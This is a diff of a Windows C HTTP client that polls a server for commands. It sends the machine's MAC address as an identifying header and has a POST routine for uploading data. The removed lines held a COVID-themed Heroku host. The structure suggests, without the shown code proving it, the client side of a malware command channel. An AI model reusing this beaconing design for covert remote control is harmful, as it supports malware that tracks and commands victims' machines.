@@ -1,5 +1,5 @@
-#define WIN32_LEAN_AND_MEAN
 #include "http.h"
+#define WIN32_LEAN_AND_MEAN
 #include "parse.h"
 #include <string.h>
 #include <stdio.h>
@@ -7,26 +7,14 @@
 #include <winsock2.h>
 #include <Ws2tcpip.h>
 #include <iphlpapi.h>
-#include <Windows.h>
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "IPHLPAPI.lib")
-#pragma comment (lib, "Mswsock.lib")
-#pragma comment (lib, "AdvApi32.lib")
-#pragma warning(disable:4996)
-#define WORKING_BUFFER_SIZE 16384
-#define MAC_ADDRESS_LENGTH 17
-#define MAX_BUFFER_LEN 1024
-#define MAX_DIGITS 16
-#define MAC_ADDRESS_ERROR "Mac address error"
-#define BAD_REQUEST_PHRASE "Bad Request"
-#define BAD_REQUEST_STATUS_CODE "400"
-#define PORT "80" // HTTP port
-#define HOST "covid-20-virus.herokuapp.com"
+#pragma comment (lib, "Ws2_32.lib")
+#pragma comment (lib, "IPHLPAPI.lib")
+#pragma warning (disable:4996)
 
 int winsock_setup(SOCKET* s) {
 	int iResult = 0;
 	WSADATA wsa_data = { 0 };
-	struct addrinfo* result = NULL, * ptr = NULL, hints;
+	struct addrinfo* result = NULL, * ptr = NULL, hints = { 0 };
 
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsa_data);
@@ -60,7 +48,7 @@ int winsock_setup(SOCKET* s) {
 			return 0;
 		}
 
-		// Connect to server.
+		// Connect to server
 		iResult = connect(*s, ptr->ai_addr, (int)ptr->ai_addrlen);
 		if (iResult == SOCKET_ERROR) {
 			closesocket(*s);
@@ -80,9 +68,7 @@ int winsock_setup(SOCKET* s) {
 	return 1;
 }
 char* create_get_http_request(HTTP_HEADER headers[], unsigned int headers_length, char* request_uri) {
-	char* request = (char*)calloc(MAX_REQUEST_LEN, sizeof(char));
-	char* get = "GET /";
-	char* http = " HTTP/1.1\r\n";
+	char* request = (char*)calloc(MAX_GET_REQUEST_LEN, sizeof(char));
 	char* parsed_headers = (char*) calloc(MAX_HEADER_LEN * headers_length, sizeof(char));
 	unsigned int parsed_headers_length = parse_request_http_headers(headers, headers_length, parsed_headers);
 
@@ -91,11 +77,11 @@ char* create_get_http_request(HTTP_HEADER headers[], unsigned int headers_length
 	GET /<request_uri> HTTP/1.1\r\n
 	<parsed_headers>\r\n
 	*/
-	strncat(request, get, strnlen(get, MAX_STR_LEN));
+	strncat(request, GET, sizeof(GET) - 1);
 	strncat(request, request_uri, strnlen(request_uri, MAX_STR_LEN));
-	strncat(request, http, strnlen(http, MAX_STR_LEN));
+	strncat(request, HTTP, sizeof(HTTP) - 1);
 	strncat(request, parsed_headers, parsed_headers_length);
-	strncat(request, "\r\n", sizeof("\r\n") - 1);
+	strncat(request, CRLF, sizeof(CRLF) - 1);
 
 	free(parsed_headers);
 	return request;
@@ -139,11 +125,10 @@ int send_without_listening(char* request, unsigned int length) {
 
 	WSACleanup();
 	return 1;
-
 }
 
-HTTP_RESPONSE send_get_command(char* request_uri) {
-	HTTP_RESPONSE http_response = { 0 };
+COMMANDS_HTTP_RESPONSE send_get_command(char* request_uri) {
+	COMMANDS_HTTP_RESPONSE http_response = { 0 };
 	char* request = NULL;
 	unsigned int headers_length = 0;
 	HTTP_HEADER headers[] = {
@@ -154,9 +139,10 @@ HTTP_RESPONSE send_get_command(char* request_uri) {
 		build_header("MAC-Address", get_mac_address())
 	};
 	headers_length = sizeof(headers) / sizeof(HTTP_HEADER);
-	request = create_get_http_request(headers, headers_length, request_uri);
+	request = create_get_http_request(headers, headers_length, request_uri); // create GET request
 	printf("SENDING REQUEST:\n%s\n", request);
-	send_request_and_listen_for_response(request, strnlen(request, MAX_REQUEST_LEN), &http_response);
+	send_request_and_listen_for_response(request,
+		strnlen(request, MAX_GET_REQUEST_LEN), &http_response);
 
 	free(request);
 	return http_response;
@@ -180,8 +166,8 @@ char* get_mac_address() {
 		lsb = pAddresses->PhysicalAddress[i] & 0x0F;
 		msb += msb < 10 ? 0x30 : 0x37;
 		lsb += lsb < 10 ? 0x30 : 0x37;
-		mac_address[length] = (char)msb;
-		mac_address[length + 1] = (char)lsb;
+		mac_address[length] = (char) msb;
+		mac_address[length + 1] = (char) lsb;
 		mac_address[length + 2] = '-';
 		length += 3;
 	}
@@ -190,7 +176,7 @@ char* get_mac_address() {
 	return mac_address;
 }
 
-int send_request_and_listen_for_response(char* request, unsigned int len, HTTP_RESPONSE* http_response) {
+int send_request_and_listen_for_response(char* request, unsigned int len, COMMANDS_HTTP_RESPONSE* http_response) {
 	SOCKET s = INVALID_SOCKET;
 	int iResult = 0;
 	char temp_buffer[MAX_BUFFER_LEN] = "";
@@ -251,8 +237,6 @@ int send_request_and_listen_for_response(char* request, unsigned int len, HTTP_R
 char* create_post_http_request_with_data(HTTP_HEADER headers[], unsigned int headers_length,
 	char* request_uri, char* body, unsigned int body_length, unsigned int* request_length) {
 	char* request = (char*) calloc(MAX_RESPONSE_LEN + body_length, sizeof(char));
-	char* post = "POST /";
-	char* http = " HTTP/1.1\r\n";
 	char* parsed_headers = (char*) calloc(MAX_HEADER_LEN * headers_length, sizeof(char));
 	unsigned int parsed_headers_length = parse_request_http_headers(headers, headers_length, parsed_headers);
 	unsigned int pos = 0;
@@ -263,20 +247,22 @@ char* create_post_http_request_with_data(HTTP_HEADER headers[], unsigned int hea
 	<parsed_headers>\r\n
 	<body>\r\n\r\n
 	*/
-	strncat(request, post, strnlen(post, MAX_STR_LEN));
-	pos += strnlen(post, MAX_STR_LEN);
-	strncat(request, request_uri, strnlen(request_uri, MAX_STR_LEN));
+	strncat(request, POST, sizeof(POST) - 1); // POST /
+	pos += sizeof(POST) - 1;
+	strncat(request, request_uri, strnlen(request_uri, MAX_STR_LEN)); // uri
 	pos += strnlen(request_uri, MAX_STR_LEN);
-	strncat(request, http, strnlen(http, MAX_STR_LEN));
-	pos += strnlen(http, MAX_STR_LEN);
-	strncat(request, parsed_headers, parsed_headers_length);
+	strncat(request, HTTP, sizeof(HTTP) - 1); // HTTP/1.1\r\n
+	pos += sizeof(HTTP) - 1;
+	strncat(request, parsed_headers, parsed_headers_length); // headers
 	pos += parsed_headers_length;
-	strncat(request, "\r\n", sizeof("\r\n") - 1);
-	pos += sizeof("\r\n") - 1;
-	memcpy(request + pos, body, body_length);
+	strncat(request, CRLF, sizeof(CRLF) - 1); // \r\n
+	pos += sizeof(CRLF) - 1;
+	memcpy(request + pos, body, body_length); // body
 	pos += body_length;
-	strncpy(request + pos, "\r\n\r\n", sizeof("\r\n\r\n") - 1);
-	pos += sizeof("\r\n\r\n") - 1;
+	strncpy(request + pos, CRLF, sizeof(CRLF) - 1); // \r\n
+	pos += sizeof(CRLF) - 1;
+	strncpy(request + pos, CRLF, sizeof(CRLF) - 1); // \r\n
+	pos += sizeof(CRLF) - 1;
 	*request_length = pos;
 	
 	free(parsed_headers);
